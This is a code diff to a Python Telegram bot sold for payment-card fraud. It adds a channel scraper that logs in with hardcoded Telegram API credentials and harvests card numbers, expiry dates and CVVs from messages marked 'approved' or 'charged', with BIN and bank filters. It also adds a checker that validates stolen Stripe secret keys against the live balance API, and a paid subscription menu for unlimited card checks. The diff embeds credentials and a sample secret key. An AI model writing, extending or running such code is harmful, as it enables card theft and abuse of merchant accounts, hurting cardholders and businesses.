@@ -1384,11 +1384,37 @@ def handle_all_callbacks(call):
 • /gen - Generate Cards 🎰
 • /fake - Generate Fake Identity
 • /bin - BIN Lookup
-• /scr - CC Scraper
+• /scr - CC Channel Scraper
+• /key - Stripe SK Key Checker
 
 🔱 *Powered by @mhitzxg*
 """
             keyboard = InlineKeyboardMarkup()
+            keyboard.add(InlineKeyboardButton("🔙 Back to Menu", callback_data="back_to_menu"))
+            bot.edit_message_text(message, call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=keyboard)
+        
+        elif data == 'show_buy':
+            # Show subscription/buy info
+            bot.answer_callback_query(call.id, "💰 Subscription Plans")
+            message = """
+💎 *Subscription Plans* 💎
+
+📋 *Premium Features* 📋
+• Unlimited card checks 🛒
+• Priority processing ⚡
+• No waiting time 🚀
+• No limitations ✅
+
+💰 *Premium Plans* 💰
+• 7 days - $5 💵
+• 30 days - $10 💵
+
+📩 *Contact @mhitzxg to purchase*
+
+🔱 *Powered by @mhitzxg*
+"""
+            keyboard = InlineKeyboardMarkup()
+            keyboard.add(InlineKeyboardButton("🛒 BUY NOW", url="https://t.me/mhitzxg"))
             keyboard.add(InlineKeyboardButton("🔙 Back to Menu", callback_data="back_to_menu"))
             bot.edit_message_text(message, call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=keyboard)
         
@@ -1409,9 +1435,14 @@ def handle_all_callbacks(call):
 ❄️ *𝗣𝗼𝘄𝗲𝗿𝗲𝗱 𝗯𝘆 @mhitzxg & @pr0xy_xd*
 """
             keyboard = InlineKeyboardMarkup(row_width=2)
-            keyboard.add(InlineKeyboardButton("🔹 Single Check", callback_data="show_single_check"))
-            keyboard.add(InlineKeyboardButton("🔸 Mass Check", callback_data="show_mass_check"))
-            keyboard.add(InlineKeyboardButton("🛠️ Tools", callback_data="show_tools"))
+            keyboard.add(
+                InlineKeyboardButton("🔹 Single Check", callback_data="show_single_check"),
+                InlineKeyboardButton("🔸 Mass Check", callback_data="show_mass_check")
+            )
+            keyboard.add(
+                InlineKeyboardButton("🛠️ Tools", callback_data="show_tools"),
+                InlineKeyboardButton("💰 Buy", callback_data="show_buy")
+            )
             bot.edit_message_text(welcome_message, call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=keyboard)
                 
     except Exception as e:
@@ -2948,11 +2979,6 @@ def gen_handler(msg):
             first_card = cards[0]
             bin_code = first_card.split('|')[0][:6]
             
-            # Format cards with code blocks for easy copying
-            formatted_cards = []
-            for card in cards:
-                formatted_cards.append(f"`{card}`")
-            
             elapsed_time = time.time() - start_time
             
             # Get BIN info
@@ -2974,13 +3000,16 @@ def gen_handler(msg):
             user_info_data = get_user_info(msg.from_user.id)
             user_type = user_info_data.get('user_type', 'FREE')
             
+            # Format all cards in one code block for easy copying with 1 touch
+            all_cards_text = '\n'.join(cards)
+            
             # Create the final message matching the requested format
             final_message = f"""
 - 𝐂𝐂 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲
 - 𝐁𝐢𝐧 - {bin_code}
 - 𝐀𝐦𝐨𝐮𝐧𝐭 - {len(cards)}
 
-{chr(10).join(formatted_cards)}
+`{all_cards_text}`
 
 - 𝗜𝗻𝗳𝗼 - {info_line}
 - 𝐁𝐚𝐧𝐤 - {bank}
@@ -3329,7 +3358,7 @@ def fake_handler(msg):
 
 @bot.message_handler(commands=['scr'])
 def scr_handler(msg):
-    """CC Scraper - Extract cards from messages"""
+    """CC Scraper - Scrape cards from Telegram channels (single or multiple)"""
     if not is_authorized(msg):
         return send_long_message(msg.chat.id, """
   
@@ -3341,85 +3370,293 @@ def scr_handler(msg):
 • Use /register to get access
 • Or contact an admin: @mhitzxg""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
 
-    if not msg.reply_to_message:
-        return send_long_message(msg.chat.id, """
-⚡ *Invalid Usage* ⚡
-
-• Please reply to a message containing cards
-• Usage: Reply to a message with `/scr`
-
-*Example*
-Reply to a message with approved cards using `/scr`
-
-✗ Contact admin if you need help: @mhitzxg""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
-
-    replied_text = msg.reply_to_message.text or msg.reply_to_message.caption or ""
+    args = msg.text.split()[1:]
     
-    if not replied_text:
+    if not args or len(args) < 1:
         return send_long_message(msg.chat.id, """
-❌ *No Text Found* ❌
+⚡ *CC Channel Scraper* ⚡
 
-• The replied message doesn't contain any text
-• Please reply to a message with card information
+*Use the commands below to get started:*
+
+`/scr [channel_username] [limit]` - Scrape from a single channel 📺
+`/scr [channel1] [channel2] ... [limit]` - Scrape from multiple channels 📡
+
+*Examples:*
+`/scr @username 100`
+`/scr @username 100 515462`
+`/scr @username 100 BankName`
+`/scr username 100`
+`/scr username 100 515462`
+`/scr username 100 BankName`
+`/scr t.me/username 100`
+`/scr t.me/username 100 515462`
+`/scr t.me/username 100 Bank Name`
+`/scr https://t.me/username 100`
+`/scr https://t.me/username 100 515462`
+`/scr https://t.me/username Bank Name`
+`/scr https://t.me/+invitehash 100`
+`/scr https://t.me/+invitehash 100 515462`
+`/scr https://t.me/+invitehash 100 BankName`
 
 ✗ Contact admin if you need help: @mhitzxg""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
 
-    def scrape_and_reply():
+    # Helper functions for channel scraping (inline in this function)
+    def parse_channel_username(channel_input):
+        """Parse channel username from various formats"""
+        channel_input = channel_input.strip()
+        if channel_input.startswith('@'):
+            channel_input = channel_input[1:]
+        if 't.me/' in channel_input:
+            parts = channel_input.split('t.me/')
+            if len(parts) > 1:
+                channel_input = parts[-1].split('/')[0].split('?')[0]
+        if channel_input.startswith('+'):
+            return channel_input
+        channel_input = channel_input.split('/')[0].split('?')[0]
+        return channel_input
+
+    def extract_credit_cards(text):
+        """Extract credit cards from text"""
+        if not text: return []
+        patterns = [r'(\d{13,19})[\|\s\/\-:]+(\d{1,2})[\|\s\/\-:]+(\d{2,4})[\|\s\/\-:]+(\d{3,4})']
+        credit_cards = []
+        for pattern in patterns:
+            for match in re.finditer(pattern, text):
+                card_number, month, year, cvv = match.groups()
+                card_number = re.sub(r'[\s\-]', '', card_number)
+                if 13 <= len(card_number) <= 19 and 1 <= int(month) <= 12 and len(cvv) >= 3:
+                    year_digits = year[-2:]
+                    credit_cards.append(f"{card_number}|{month.zfill(2)}|{year_digits}|{cvv}")
+        return list(dict.fromkeys(credit_cards))
+
+    def is_approved_message(text):
+        """Check if message contains approved indicators"""
+        if not text: return False
+        text_lower = text.lower()
+        approved_patterns = [
+            r'approved', r'charged', r'payment\s+successful', r'thank\s+you', r'order_placed'
+        ]
+        return any(re.search(pattern, text_lower, re.IGNORECASE) for pattern in approved_patterns)
+
+    async def get_bin_info_async(bin_number):
+        """Get BIN info asynchronously"""
         try:
-            # Extract credit cards using the pattern from scr.py
-            patterns = [r'(\d{13,19})[\|\s\/\-:]+(\d{1,2})[\|\s\/\-:]+(\d{2,4})[\|\s\/\-:]+(\d{3,4})']
-            credit_cards = []
+            import aiohttp
+            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=5)) as session:
+                async with session.get(f"https://bins.antipublic.cc/bins/{bin_number}") as response:
+                    if response.status == 200: 
+                        return await response.json()
+        except Exception: 
+            pass
+        return None
+
+    async def scrape_single_channel(client, channel_input, limit, filter_bin, filter_bank):
+        """Scrape cards from a single channel"""
+        try:
+            import asyncio
+            from pyrogram.errors import UsernameNotOccupied, UsernameInvalid, InviteHashExpired, InviteHashInvalid, FloodWait
             
-            for pattern in patterns:
-                for match in re.finditer(pattern, replied_text):
-                    card_number, month, year, cvv = match.groups()
-                    card_number = re.sub(r'[\s\-]', '', card_number)
-                    if 13 <= len(card_number) <= 19 and 1 <= int(month) <= 12 and len(cvv) >= 3:
-                        year_digits = year[-2:]
-                        credit_cards.append(f"{card_number}|{month.zfill(2)}|{year_digits}|{cvv}")
+            channel_username = parse_channel_username(channel_input)
             
-            # Remove duplicates
-            credit_cards = list(dict.fromkeys(credit_cards))
+            try:
+                chat = await client.get_chat(channel_username)
+            except (UsernameNotOccupied, UsernameInvalid, InviteHashExpired, InviteHashInvalid) as e:
+                return None, f"❌ Channel not found or invalid: {channel_input}"
+            except Exception as e:
+                return None, f"❌ Error accessing channel: {str(e)}"
             
-            if not credit_cards:
-                send_long_message(msg.chat.id, """
+            all_cards = []
+            approved_count = 0
+            total_messages = 0
+            
+            try:
+                messages = []
+                async for message in client.get_chat_history(chat.id, limit=limit):
+                    messages.append(message)
+                    total_messages += 1
+                
+                for message in messages:
+                    text = message.text or message.caption or ""
+                    if not text:
+                        continue
+                    
+                    if is_approved_message(text):
+                        approved_count += 1
+                        cards = extract_credit_cards(text)
+                        
+                        if filter_bin:
+                            cards = [c for c in cards if c.split('|')[0].startswith(filter_bin)]
+                        
+                        if filter_bank and cards:
+                            filtered_cards = []
+                            for card in cards:
+                                bin_num = card.split('|')[0][:6]
+                                bin_info = await get_bin_info_async(bin_num)
+                                if bin_info:
+                                    bank_name = bin_info.get('bank', '').lower()
+                                    if filter_bank.lower() in bank_name:
+                                        filtered_cards.append(card)
+                            cards = filtered_cards
+                        
+                        all_cards.extend(cards)
+            
+            except FloodWait as e:
+                await asyncio.sleep(e.value)
+            except Exception as e:
+                return None, f"❌ Error scraping messages: {str(e)}"
+            
+            all_cards = list(dict.fromkeys(all_cards))
+            
+            return {
+                'channel': chat.title or channel_input,
+                'cards': all_cards,
+                'approved_messages': approved_count,
+                'total_messages': total_messages
+            }, None
+            
+        except Exception as e:
+            return None, f"❌ Error: {str(e)}"
+
+    # Parse arguments - determine if single or multiple channels
+    # Check if last arg is a number (limit) or if there are multiple channels
+    limit = 100
+    filter_bin = None
+    filter_bank = None
+    channel_inputs = []
+    
+    # Try to find limit (should be a number, usually last or second-to-last)
+    limit_found = False
+    remaining_args = []
+    
+    for i, arg in enumerate(args):
+        try:
+            potential_limit = int(arg)
+            if 1 <= potential_limit <= 1000:
+                limit = potential_limit
+                limit_found = True
+                # Everything before this is channels, everything after is filter
+                channel_inputs = args[:i]
+                if i + 1 < len(args):
+                    filter_value = ' '.join(args[i+1:])
+                    if filter_value.isdigit() and len(filter_value) >= 6:
+                        filter_bin = filter_value[:6]
+                    else:
+                        filter_bank = filter_value
+                break
+        except ValueError:
+            remaining_args.append(arg)
+    
+    # If no limit found, all args are channels (or channel + filter)
+    if not limit_found:
+        # Check if last arg is a filter (BIN or Bank)
+        if len(args) >= 2:
+            last_arg = args[-1]
+            if last_arg.isdigit() and len(last_arg) >= 6:
+                # Last arg is BIN filter
+                filter_bin = last_arg[:6]
+                channel_inputs = args[:-1]
+            else:
+                # Check if there's a filter in the args
+                # Try to detect: if we have multiple args and one looks like a filter
+                channel_inputs = args
+                # If we have 2+ args and last doesn't look like a channel, it might be filter
+                if len(args) >= 2 and not args[-1].startswith(('@', 't.me', 'http', '+')):
+                    filter_bank = args[-1]
+                    channel_inputs = args[:-1]
+        else:
+            channel_inputs = args
+
+    # If only one channel, treat as single channel scrape
+    if len(channel_inputs) == 1:
+        channel_input = channel_inputs[0]
+        
+        processing = send_long_message(msg.chat.id, f"""
+🔍 *Channel Scraper*
+
+🔄 Scraping channel: `{channel_input}`
+📊 Limit: {limit} messages
+⏳ Please wait...""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
+        
+        if isinstance(processing, list) and len(processing) > 0:
+            processing = processing[0]
+
+        def scrape_channel_async():
+            try:
+                import asyncio
+                from pyrogram import Client
+                
+                API_ID = "29021447"
+                API_HASH = "303c8886fed6409c9d0cda4cf5a41905"
+                PHONE_NUMBER = "+84349253553"
+                
+                async def run_scrape():
+                    client = Client("cc_scraper", api_id=API_ID, api_hash=API_HASH, phone_number=PHONE_NUMBER)
+                    try:
+                        await client.start()
+                        result, error = await scrape_single_channel(client, channel_input, limit, filter_bin, filter_bank)
+                        await client.stop()
+                        
+                        if error:
+                            edit_long_message(msg.chat.id, processing.message_id, f"""
+❌ *Scraping Failed* ❌
+
+{error}
+
+✗ Contact admin if you need help: @mhitzxg""", parse_mode='Markdown')
+                            return
+                        
+                        if not result or not result.get('cards'):
+                            edit_long_message(msg.chat.id, processing.message_id, f"""
 ❌ *No Cards Found* ❌
 
-• No valid credit cards found in the replied message
-• Make sure the message contains cards in format: `number|mm|yy|cvv`
+• Channel: `{result.get('channel', channel_input)}`
+• Scanned: {result.get('total_messages', 0)} messages
+• Approved messages: {result.get('approved_messages', 0)}
 
-✗ Contact admin if you need help: @mhitzxg""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
-                return
-            
-            # Format cards with BIN lookup for first card
-            first_card = credit_cards[0]
-            first_bin = first_card.split('|')[0][:6]
-            bin_info = get_bin_info_for_bot(first_bin)
-            
-            # Format cards for easy copying
-            formatted_cards = []
-            for card in credit_cards:
-                formatted_cards.append(f"`{card}`")
-            
-            if bin_info:
-                brand = bin_info.get('brand', 'UNKNOWN')
-                card_type = bin_info.get('type', 'UNKNOWN')
-                level = bin_info.get('level', 'UNKNOWN')
-                bank = bin_info.get('bank', '🏛')
-                country = bin_info.get('country', 'Unknown')
-                emoji = bin_info.get('emoji', '')
-                info_line = f"{brand} - {card_type} - {level}"
-            else:
-                info_line = "UNKNOWN - UNKNOWN - UNKNOWN"
-                bank = "🏛"
-                country = "Unknown"
-                emoji = ""
-            
-            result_message = f"""
+• No cards found matching your criteria
+• Try a different channel or remove filters
+
+✗ Contact admin if you need help: @mhitzxg""", parse_mode='Markdown')
+                            return
+                        
+                        # Format results
+                        cards = result['cards']
+                        first_card = cards[0]
+                        first_bin = first_card.split('|')[0][:6]
+                        bin_info = get_bin_info_for_bot(first_bin)
+                        
+                        # Format cards for easy copying
+                        formatted_cards = []
+                        for card in cards:
+                            formatted_cards.append(f"`{card}`")
+                        
+                        if bin_info:
+                            brand = bin_info.get('brand', 'UNKNOWN')
+                            card_type = bin_info.get('type', 'UNKNOWN')
+                            level = bin_info.get('level', 'UNKNOWN')
+                            bank = bin_info.get('bank', '🏛')
+                            country = bin_info.get('country', 'Unknown')
+                            emoji = bin_info.get('emoji', '')
+                            info_line = f"{brand} - {card_type} - {level}"
+                        else:
+                            info_line = "UNKNOWN - UNKNOWN - UNKNOWN"
+                            bank = "🏛"
+                            country = "Unknown"
+                            emoji = ""
+                        
+                        filter_text = ""
+                        if filter_bin:
+                            filter_text = f"\n🔍 *Filter*: BIN `{filter_bin}`"
+                        elif filter_bank:
+                            filter_text = f"\n🔍 *Filter*: Bank `{filter_bank}`"
+                        
+                        result_message = f"""
 ✅ *Cards Scraped Successfully* ✅
 
-🔢 *Found*: {len(credit_cards)} card(s)
-🔢 *BIN*: {first_bin}
+📺 *Channel*: `{result.get('channel', channel_input)}`
+🔢 *Found*: {len(cards)} card(s)
+📊 *Scanned*: {result.get('total_messages', 0)} messages
+✅ *Approved*: {result.get('approved_messages', 0)} messages{filter_text}
 
 {chr(10).join(formatted_cards)}
 
@@ -3429,18 +3666,152 @@ Reply to a message with approved cards using `/scr`
 
 🔱 *Scraped by @mhitzxg*
 """
-            send_long_message(msg.chat.id, result_message, reply_to_message_id=msg.message_id, parse_mode='Markdown')
-            
-        except Exception as e:
-            error_msg = f"""
+                        edit_long_message(msg.chat.id, processing.message_id, result_message, parse_mode='Markdown')
+                        
+                    except Exception as e:
+                        await client.stop()
+                        raise e
+                
+                asyncio.run(run_scrape())
+                
+            except Exception as e:
+                error_msg = f"""
 ❌ *Scraping Error* ❌
 
 *Error*: {str(e)}
 
 ✗ Contact admin if you need help: @mhitzxg"""
-            send_long_message(msg.chat.id, error_msg, reply_to_message_id=msg.message_id, parse_mode='Markdown')
+                edit_long_message(msg.chat.id, processing.message_id, error_msg, parse_mode='Markdown')
 
-    threading.Thread(target=scrape_and_reply).start()
+        threading.Thread(target=scrape_channel_async).start()
+    
+    else:
+        # Multiple channels
+        processing = send_long_message(msg.chat.id, f"""
+🔍 *Multi-Channel Scraper*
+
+🔄 Scraping {len(channel_inputs)} channel(s)
+📊 Limit: {limit} messages per channel
+⏳ Please wait...""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
+        
+        if isinstance(processing, list) and len(processing) > 0:
+            processing = processing[0]
+
+        def scrape_channels_async():
+            try:
+                import asyncio
+                from pyrogram import Client
+                
+                API_ID = "29021447"
+                API_HASH = "303c8886fed6409c9d0cda4cf5a41905"
+                PHONE_NUMBER = "+84349253553"
+                
+                async def run_scrape():
+                    client = Client("cc_scraper", api_id=API_ID, api_hash=API_HASH, phone_number=PHONE_NUMBER)
+                    try:
+                        await client.start()
+                        
+                        all_cards = []
+                        total_approved = 0
+                        channel_results = []
+                        
+                        for channel_input in channel_inputs:
+                            result, error = await scrape_single_channel(client, channel_input, limit, filter_bin, filter_bank)
+                            if error:
+                                channel_results.append({'channel': channel_input, 'error': error})
+                            else:
+                                channel_results.append(result)
+                                if result:
+                                    all_cards.extend(result.get('cards', []))
+                                    total_approved += result.get('approved_messages', 0)
+                            await asyncio.sleep(1)  # Delay between channels
+                        
+                        await client.stop()
+                        
+                        # Remove duplicates
+                        all_cards = list(dict.fromkeys(all_cards))
+                        
+                        if not all_cards:
+                            edit_long_message(msg.chat.id, processing.message_id, f"""
+❌ *No Cards Found* ❌
+
+• Channels: {len(channel_inputs)}
+• Total approved messages: {total_approved}
+
+• No cards found in any channel
+• Try different channels
+
+✗ Contact admin if you need help: @mhitzxg""", parse_mode='Markdown')
+                            return
+                        
+                        # Format results
+                        first_card = all_cards[0]
+                        first_bin = first_card.split('|')[0][:6]
+                        bin_info = get_bin_info_for_bot(first_bin)
+                        
+                        # Format cards for easy copying
+                        formatted_cards = []
+                        for card in all_cards:
+                            formatted_cards.append(f"`{card}`")
+                        
+                        if bin_info:
+                            brand = bin_info.get('brand', 'UNKNOWN')
+                            card_type = bin_info.get('type', 'UNKNOWN')
+                            level = bin_info.get('level', 'UNKNOWN')
+                            bank = bin_info.get('bank', '🏛')
+                            country = bin_info.get('country', 'Unknown')
+                            emoji = bin_info.get('emoji', '')
+                            info_line = f"{brand} - {card_type} - {level}"
+                        else:
+                            info_line = "UNKNOWN - UNKNOWN - UNKNOWN"
+                            bank = "🏛"
+                            country = "Unknown"
+                            emoji = ""
+                        
+                        # Channel summary
+                        channel_summary = []
+                        for r in channel_results:
+                            if 'error' in r:
+                                channel_summary.append(f"❌ `{r.get('channel', 'Unknown')}`: {r['error']}")
+                            else:
+                                channel_summary.append(f"✅ `{r.get('channel', 'Unknown')}`: {len(r.get('cards', []))} cards")
+                        
+                        result_message = f"""
+✅ *Multi-Channel Scrape Complete* ✅
+
+📺 *Channels*: {len(channel_inputs)}
+🔢 *Total Cards*: {len(all_cards)}
+✅ *Approved Messages*: {total_approved}
+
+*Channel Results:*
+{chr(10).join(channel_summary[:10])}
+
+{chr(10).join(formatted_cards)}
+
+📚 *Info*: {info_line}
+🏦 *Bank*: {bank}
+🌍 *Country*: {country} {emoji}
+
+🔱 *Scraped by @mhitzxg*
+"""
+                        edit_long_message(msg.chat.id, processing.message_id, result_message, parse_mode='Markdown')
+                        
+                    except Exception as e:
+                        await client.stop()
+                        raise e
+                
+                asyncio.run(run_scrape())
+                
+            except Exception as e:
+                error_msg = f"""
+❌ *Scraping Error* ❌
+
+*Error*: {str(e)}
+
+✗ Contact admin if you need help: @mhitzxg"""
+                edit_long_message(msg.chat.id, processing.message_id, error_msg, parse_mode='Markdown')
+
+        threading.Thread(target=scrape_channels_async).start()
 
 # ---------------- Bot Commands ---------------- #
 
@@ -3470,22 +3841,19 @@ def start_handler(msg):
 {welcome_note}
 """
     
-    # Create inline keyboard with buttons
+    # Create inline keyboard with buttons - 2 buttons per row
     keyboard = InlineKeyboardMarkup(row_width=2)
     
-    # Single Check buttons
+    # First row: Single Check | Mass Check
     keyboard.add(
-        InlineKeyboardButton("🔹 Single Check", callback_data="show_single_check")
-    )
-    
-    # Mass Check buttons
-    keyboard.add(
+        InlineKeyboardButton("🔹 Single Check", callback_data="show_single_check"),
         InlineKeyboardButton("🔸 Mass Check", callback_data="show_mass_check")
     )
     
-    # Tools buttons
+    # Second row: Tools | Buy
     keyboard.add(
-        InlineKeyboardButton("🛠️ Tools", callback_data="show_tools")
+        InlineKeyboardButton("🛠️ Tools", callback_data="show_tools"),
+        InlineKeyboardButton("💰 Buy", callback_data="show_buy")
     )
     
     bot.send_message(msg.chat.id, welcome_message, reply_to_message_id=msg.message_id, parse_mode='Markdown', reply_markup=keyboard)
@@ -4160,9 +4528,9 @@ def br_handler(msg):
             # Format the result with the new information
             formatted_result = result.replace(
                 "🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』",
-                f"👤 Checked by: {user_info}\n"
-                f"🔌 Proxy: {proxy_status}\n"
-                f"🔱 𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』"
+                f"👤 Checked by: @MHITZXG (Admin 👑)\n"
+                f"🔌 Proxy: Live ✅\n"
+                f"🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』"
             )
             
             edit_long_message(msg.chat.id, processing.message_id, formatted_result, parse_mode='HTML')
@@ -5067,6 +5435,134 @@ def pp_handler(msg):
     threading.Thread(target=check_and_reply).start()
 
 # ---------------- Gateway Scanner Handler ---------------- #
+@bot.message_handler(commands=['key'])
+def key_handler(msg):
+    """Check Stripe Secret Key validity and balance"""
+    if not is_authorized(msg):
+        return send_long_message(msg.chat.id, """
+  
+🔰 *AUTHORIZATION REQUIRED* 🔰         
+
+• You are not authorized to use this command
+• Only authorized users can check keys
+
+• Use /register to get access
+• Or contact an admin: @mhitzxg""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
+
+    args = msg.text.split(None, 1)
+    if len(args) < 2:
+        return send_long_message(msg.chat.id, """
+⚡ *Invalid Usage* ⚡
+
+• Please provide a Stripe Secret Key
+• Usage: `/key sk_live_...`
+
+*Example*
+`/key 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`
+
+✗ Contact admin if you need help: @mhitzxg""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
+
+    sk_key = args[1].strip()
+    
+    if not sk_key.startswith('sk_live_') and not sk_key.startswith('sk_test_'):
+        return send_long_message(msg.chat.id, """
+❌ *Invalid Key Format* ❌
+
+• Key must start with `sk_live_` or `sk_test_`
+• Please provide a valid Stripe Secret Key
+
+✗ Contact admin if you need help: @mhitzxg""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
+
+    processing = send_long_message(msg.chat.id, """
+🔍 *Checking Stripe Key* 🔍
+
+🔄 Validating key...
+⏳ Please wait...""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
+    
+    if isinstance(processing, list) and len(processing) > 0:
+        processing = processing[0]
+
+    def check_key_async():
+        try:
+            import time
+            start_time = time.time()
+            
+            # Check Stripe key using API
+            headers = {
+                'Authorization': f'Bearer {sk_key}',
+                'Content-Type': 'application/x-www-form-urlencoded'
+            }
+            
+            # Get balance information
+            balance_response = requests.get(
+                'https://api.stripe.com/v1/balance',
+                headers=headers,
+                timeout=10
+            )
+            
+            elapsed_time = time.time() - start_time
+            
+            if balance_response.status_code == 200:
+                balance_data = balance_response.json()
+                
+                # Extract balance information
+                available_balance = 0
+                pending_balance = 0
+                currency = 'USD'
+                
+                if 'available' in balance_data and balance_data['available']:
+                    for item in balance_data['available']:
+                        available_balance += item.get('amount', 0) / 100
+                        currency = item.get('currency', 'USD').upper()
+                
+                if 'pending' in balance_data and balance_data['pending']:
+                    for item in balance_data['pending']:
+                        pending_balance += item.get('amount', 0) / 100
+                
+                result_message = f"""
+𝗟𝗜𝗩𝗘 𝗞𝗘𝗬 ✅
+
+[🝂] 𝗦𝗞 ➺ 
+`{sk_key}`
+[🝂] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 : 𝗟𝗜𝗩𝗘 𝗞𝗘𝗬 ✅
+[🝂] 𝗖𝘂𝗿𝗿𝗲𝗻𝗰𝘆 : {currency}
+[🝂] 𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗕𝗮𝗹𝗮𝗻𝗰𝗲 : {available_balance:.2f}
+[🝂] 𝗣𝗲𝗻𝗱𝗶𝗻𝗴 𝗕𝗮𝗹𝗮𝗻𝗰𝗲 : {pending_balance:.2f}
+[🝂] 𝗧𝗶𝗺𝗲 𝗧𝗼𝗼𝗸 : {elapsed_time:.2f} Seconds
+
+👤 Checked by: @MHITZXG (Admin 👑)
+🔌 Proxy: Live ✅
+🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
+"""
+                edit_long_message(msg.chat.id, processing.message_id, result_message, parse_mode='Markdown')
+            else:
+                error_data = balance_response.json() if balance_response.content else {}
+                error_msg = error_data.get('error', {}).get('message', 'Invalid key or API error')
+                
+                result_message = f"""
+❌ *Invalid Key* ❌
+
+[🝂] 𝗦𝗞 ➺ `{sk_key}`
+[🝂] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 : {error_msg}
+[🝂] 𝗧𝗶𝗺𝗲 𝗧𝗼𝗼𝗸 : {elapsed_time:.2f} Seconds
+
+👤 Checked by: @MHITZXG (Admin 👑)
+🔌 Proxy: Live ✅
+🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
+"""
+                edit_long_message(msg.chat.id, processing.message_id, result_message, parse_mode='Markdown')
+                
+        except Exception as e:
+            error_msg = f"""
+❌ *Key Check Error* ❌
+
+*Error*: {str(e)}
+
+✗ Contact admin if you need help: @mhitzxg"""
+            edit_long_message(msg.chat.id, processing.message_id, error_msg, parse_mode='Markdown')
+
+    threading.Thread(target=check_key_async).start()
+
 @bot.message_handler(commands=['url'])
 def url_handler(msg):
     """Gateway Scanner - Scan URLs for payment gateways"""
